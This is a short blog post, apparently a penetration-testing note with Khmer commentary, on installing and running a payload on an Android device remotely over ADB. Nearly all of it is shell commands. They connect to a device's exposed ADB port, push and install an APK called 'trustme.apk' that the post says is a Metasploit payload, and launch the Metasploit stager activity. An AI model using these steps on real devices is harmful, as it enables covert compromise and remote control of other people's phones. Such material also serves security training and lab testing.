---
title: "Android - Install and Run Payload Remotely via ADB"
date: 2025-06-05T13:00:00+07:00
description: របៀបតម្លើងនិងដំណើរការ Payload ពីចម្ងាយ
draft: false
hideToc: false
enableToc: true
enableTocContent: false
author: thik
authorEmoji: 🐱
tags: 
- payload
categories:
- ADB
series:
- Android
image: images/feature3/terminal.gif
---

#### ភ្ជាប់ម៉ាស៊ីន Android ដោយប្រើប្រាស់ ADB

{{< highlight shell "linenos=table" >}}
//តម្លើងកម្មវិធី ADB
sudo apt-get install android-tools-adb

//ភ្ជាប់ម៉ាស៊ីន Android
adb connect 172.16.xxx.xxx:5555
{{< / highlight >}}

#### តម្លើងកម្មវិធីដោយប្រើប្រាស់ ADB

{{< highlight shell "linenos=table" >}}
//បញ្ជូន Payload ចូលទៅក្នុងម៉ាស៊ីន Android
adb push C:\trustme.apk /sdcard/0/Download/

//តម្លើង Payload តាមរយៈ ADB
adb install trustme.apk (metasploit package payload)
{{< / highlight >}}

#### បើកដំណើរការកម្មវិធីដោយប្រើប្រាស់ ADB

{{< highlight shell "linenos=table" >}}
//បើកបង្ហាញកម្មវិធីដែលបានតម្លើង
//វានឹងបង្ហាញ Package ដែលបានតម្លើង យើងត្រូវមើលចុងកន្ទុយឈ្មោះនៃកម្មវិធី (com.example.etc)
adb shell pm list packages -f -3

//បើកដំណើរការ Payload
adb shell am start -n com.metasploit.stage/.MainActivity

//ដើម្បីដឹងឈ្មោះរបស់ MainActivity យើងអាចប្រើប្រាស់ខាំមិនខាងក្រោម

#windows
adb shell dumpsys package com.example.etc | findstr -i Activity

#linux
adb shell dumpsys package com.example.etc | grep -i activity
{{< / highlight >}}










